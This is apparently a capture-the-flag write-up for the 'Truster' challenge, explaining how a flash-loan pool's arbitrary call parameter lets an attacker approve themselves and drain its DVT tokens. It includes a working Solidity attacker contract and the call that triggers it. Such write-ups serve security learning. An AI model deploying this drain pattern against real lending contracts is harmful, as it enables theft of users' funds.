# Challenge 2 — Truster

## Description

The `TrusterLenderPool` contract, offering flash loans of DVT tokens for free, contains the `flashLoan` functions with the arguments:

- `borrowAmount`: the amount of the flash loan.
- `borrower`: the address of the borrower to which the funds will be sent.
- `target`: an address to perform a function call into with a payload defined as the `data` parameter.

At the end of the `flashLoan` function, there is still a check which consists of ensuring that the amount available on the contract at the end of the flash loan is indeed greater than or equal to the amount before the flash loan. This guarantees that the flash loan has been repaid by the borrower.

## Vulnerability

Inside the `flashLoan` function, there is no safety mechanism to know which function is called in the `call` from the loanee contract to repay the loan. Instead, the loanee contract can call whatever function it wants using the `data` argument.

We can then imagine passing the `approve` function of the ERC20 standard here, so that the attacker's address takes possession of all the tokens available in the contract. The arguments of the `approve` function in this case will therefore be:

- `spender`: the attacker's address.
- `amount`: the total pool supply.

Thanks to the `functionCall`, the `TrusterLenderPool` smart contract will be considered as the `msg.sender` when calling the `approve` function.

In order for the transaction to be validated and for the entire function to run correctly, the last verification must be passed concerning the amount available on the contract after the flash loan, which must be greater than or equal to the amount before. But if the amount to borrow, defined by the borrower is 0, then there is nothing to repay and the borrower is not obliged to make any repayment.


## How to exploit?

1. Create a `TrusterAttacker` contract that calls the `flashLoan` function from the `TrusterLenderPool` pool.

	```solidity
	contract TrusterAttacker {
	    using SafeMath for uint256;
	    using Address for address payable;

	    constructor() public {}

	    function attack(IERC20 token, ITrusterLenderPool pool, address attackerEOA)
	        public
	    {
	        uint256 poolBalance = token.balanceOf(address(pool));
	        // IERC20::approve(address spender, uint256 amount)
	        // flashloan executes "target.call(data);", approve our contract to withdraw all liquidity
	        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
	        pool.flashLoan(0, attackerEOA, address(token), approvePayload);

	        // once approved, use transferFrom to withdraw all pool liquidity
	        token.transferFrom(address(pool), attackerEOA, poolBalance);
	    }
	}
	```

2. Pass the following arguments for the `flashLoan` call:

	-  `amount`: 0.
	- `borrower`: `TrusterAttacker` address.
	- `target`: DVT token address.
	- `data`: encoded `approve` function where the attacker is the `spender` and the pool’s balance is the `amount`

As we can see, the `attack` function here uses the `approve` function to give the right to the `TrusterAttacker` contract to transfer funds from the `TrusterLenderPool` pool on behalf of the pool. Thus, after this step, the ERC20 `transferFrom` function is used to directly transfer all the funds from the `TrusterLenderPool` pool to the `TrusterAttacker` contract.

3. Call the `attack` function of the `TrusterAttacker` contract:
	```javascript
	await this.attacker.attack(this.token.address, this.pool.address, attacker);
	```

4. All the funds of the `TrusterLenderPool` pool are transferred from the pool to the attacker address.
